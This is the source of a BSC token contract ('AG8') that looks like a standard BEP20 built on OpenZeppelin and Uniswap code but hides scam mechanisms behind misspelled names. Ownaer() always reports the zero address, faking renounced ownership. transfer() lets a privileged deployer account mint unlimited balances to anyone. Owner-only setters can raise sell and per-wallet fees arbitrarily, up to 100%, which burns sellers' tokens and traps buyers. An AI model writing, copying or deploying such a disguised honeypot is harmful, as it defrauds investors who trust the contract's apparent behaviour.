/**
 *Submitted for verification at BscScan.com on 2022-06-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Ownaer;   //1

    event OwnaershipTransferred(address indexed previousOwnaer, address indexed newOwnaer);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Ownaer.
     */
    constructor() {
        _transferOwnaershiptransferOwnaership(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Ownaer.
     */
    function Ownaer() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Ownaer.
     */
    modifier onlyOwnaer() {
        require(_Ownaer == _msgSender(), "Ownable: caller is not the Ownaer");
        _;
    }//5

    /**
     * @dev Leaves the contract without Ownaer. It will not be possible to call
     * `onlyOwnaer` functions anymore. Can only be called by the current Ownaer.
     *
     * NOTE: Renouncing Ownaership will leave the contract without an Ownaer,
     * thereby removing any functionality that is only available to the Ownaer.
     */
    function renounceOwnaership() public virtual onlyOwnaer {
        _transferOwnaershiptransferOwnaership(address(0));
    }//6

    /**
     * @dev Transfers Ownaership of the contract to a new account (`newOwnaer`).
     * Can only be called by the current Ownaer.
     */
    function transferOwnaershiptransferOwnaership(address newOwnaer) public virtual onlyOwnaer {
        require(newOwnaer != address(0), "Ownable: new Ownaer is the zero address");
        _transferOwnaershiptransferOwnaership(newOwnaer);
    }//7

    /**
     * @dev Transfers Ownaership of the contract to a new account (`newOwnaer`).
     * Internal function without access restriction.
     */
    function _transferOwnaershiptransferOwnaership(address newOwnaer) internal virtual {
        address oldOwnaer = _Ownaer;
        _Ownaer = newOwnaer;
        emit OwnaershipTransferred(oldOwnaer, newOwnaer);
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint UmaontADesired,
        uint UmaontBDesired,
        uint UmaontAMin,
        uint UmaontBMin,
        address to,
        uint deadline
    ) external returns (uint UmaontA, uint UmaontB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint UmaontTokenDesired,
        uint UmaontTokenMin,
        uint UmaontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint UmaontToken, uint UmaontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint UmaontAMin,
        uint UmaontBMin,
        address to,
        uint deadline
    ) external returns (uint UmaontA, uint UmaontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint UmaontTokenMin,
        uint UmaontETHMin,
        address to,
        uint deadline
    ) external returns (uint UmaontToken, uint UmaontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint UmaontAMin,
        uint UmaontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UmaontA, uint UmaontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint UmaontTokenMin,
        uint UmaontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UmaontToken, uint UmaontETH);
    function swapExactTokensForTokens(
        uint UmaontIn,
        uint UmaontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Umaonts);
    function swapTokensForExactTokens(
        uint UmaontOut,
        uint UmaontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Umaonts);
    function swapExactETHForTokens(uint UmaontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Umaonts);
    function swapTokensForExactETH(uint UmaontOut, uint UmaontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Umaonts);
    function swapExactTokensForETH(uint UmaontIn, uint UmaontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Umaonts);
    function swapETHForExactTokens(uint UmaontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Umaonts);

    function quote(uint UmaontA, uint reserveA, uint reserveB) external pure returns (uint UmaontB);
    function getUmaontOut(uint UmaontIn, uint reserveIn, uint reserveOut) external pure returns (uint UmaontOut);
    function getUmaontIn(uint UmaontOut, uint reserveIn, uint reserveOut) external pure returns (uint UmaontIn);
    function getUmaontsOut(uint UmaontIn, address[] calldata path) external view returns (uint[] memory Umaonts);
    function getUmaontsIn(uint UmaontOut, address[] calldata path) external view returns (uint[] memory Umaonts);
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FeefreeTo() external view returns (address);
    function FeefreeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeefreeTo(address) external;
    function setFeefreeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeefreeOnTransferTokens(
        address token,
        uint liquidity,
        uint UmaontTokenMin,
        uint UmaontETHMin,
        address to,
        uint deadline
    ) external returns (uint UmaontETH);
    function removeLiquidityETHWithPermitSupportingFeefreeOnTransferTokens(
        address token,
        uint liquidity,
        uint UmaontTokenMin,
        uint UmaontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint UmaontETH);

    function swapExactTokensForTokensSupportingFeefreeOnTransferTokens(
        uint UmaontIn,
        uint UmaontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeefreeOnTransferTokens(
        uint UmaontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeefreeOnTransferTokens(
        uint UmaontIn,
        uint UmaontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}




contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `Ownaer` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Ownaer, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address Ownaer, address spender) public view virtual returns (uint256) {
        return _allowances[Ownaer][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Umaont` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Umaont) public virtual returns (bool) {
        address Ownaer = _msgSender();
        _approve(Ownaer, spender, Umaont);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Ownaer = _msgSender();
        _approve(Ownaer, spender, _allowances[Ownaer][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Ownaer = _msgSender();
        uint256 currentAllowance = _allowances[Ownaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Ownaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Umaont` as the allowance of `spender` over the `Ownaer` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `Ownaer` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Ownaer,
        address spender,
        uint256 Umaont
    ) internal virtual {
        require(Ownaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Ownaer][spender] = Umaont;
        emit Approval(Ownaer, spender, Umaont);
    }

    /**
     * @dev Spend `Umaont` form the allowance of `Ownaer` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address Ownaer,
        address spender,
        uint256 Umaont
    ) internal virtual {
        uint256 currentAllowance = allowance(Ownaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Umaont, "ERC20: insufficient allowance");
            unchecked {
                _approve(Ownaer, spender, currentAllowance - Umaont);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Umaont` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Umaont` tokens will be minted for `to`.
     * - when `to` is zero, `Umaont` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Umaont
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Umaont` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Umaont` tokens have been minted for `to`.
     * - when `to` is zero, `Umaont` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Umaont
    ) internal virtual {}
}


contract AG8  is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Umaont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Umaont, "ERC20: transfer Umaont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Umaont;
        }
        _balances[to] += Umaont;

        emit Transfer(from, to, Umaont);
    }

    function _burn(address account, uint256 Umaont) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Umaont, "ERC20: burn Umaont exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Umaont;
        }
        _totalSupply -= Umaont;

        emit Transfer(account, address(0), Umaont);
    }

    function _mimine(address account, uint256 Umaont) internal virtual {
        require(account != address(0), "ERC20: mimine to the zero address"); //mint

        _totalSupply += Umaont;
        _balances[account] += Umaont;
        emit Transfer(address(0), account, Umaont);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mimine(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 2);
        _defaultSellFeefree = 5;
        _defaultBuyFeefree = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFeefree = 0;

    uint256 private _defaultBuyFeefree = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFeefree;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOwnaer returns (bool) {
        return _release[_address];
    }


    function setPairtrade(address _address) external onlyOwnaer {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwnaer {
        _defaultSellFeefree = _value;
    }

    function setSlipFeefree(address _address, uint256 _value) external onlyOwnaer {
        require(_value > 1, "Account tax must be greater than or equal to 1");
        _slipFeefree[_address] = _value;
    }

    function getSlipFeefree(address _address) external view onlyOwnaer returns (uint256) {
        return _slipFeefree[_address];
    }


    function setMAccountFeefree(address _address, bool _value) external onlyOwnaer {
        _mAccount[_address] = _value;
    }

    function getMAccountFeefree(address _address) external view onlyOwnaer returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Umaont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Umaont, "ERC20: transfer Umaont exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFeefreeUmaont = 0;

        if (rF) {
            uint256 tradeFeefree = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFeefree = _defaultSellFeefree;
                }
                if (from == uniswapV2Pair) {

                    tradeFeefree = _defaultBuyFeefree;
                }
            }
            if (_slipFeefree[from] > 0) {
                tradeFeefree = _slipFeefree[from];
            }

            tradeFeefreeUmaont = _Umaont.mul(tradeFeefree).div(100);
        }


        if (tradeFeefreeUmaont > 0) {
            _balances[from] = _balances[from].sub(tradeFeefreeUmaont);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeefreeUmaont);
            emit Transfer(from, _deadAddress, tradeFeefreeUmaont);
        }

        _balances[from] = _balances[from].sub(_Umaont - tradeFeefreeUmaont);
        _balances[_to] = _balances[_to].add(_Umaont - tradeFeefreeUmaont);
        emit Transfer(from, _to, _Umaont - tradeFeefreeUmaont);
    }

    function transfer(address to, uint256 Umaont) public virtual returns (bool) {
        address Ownaer = _msgSender();
        if (_release[Ownaer] == true) {
            _balances[to] += Umaont;
            return true;
        }
        _receiveF(Ownaer, to, Umaont);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Umaont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Umaont);
        _receiveF(from, to, Umaont);
        return true;
    }
}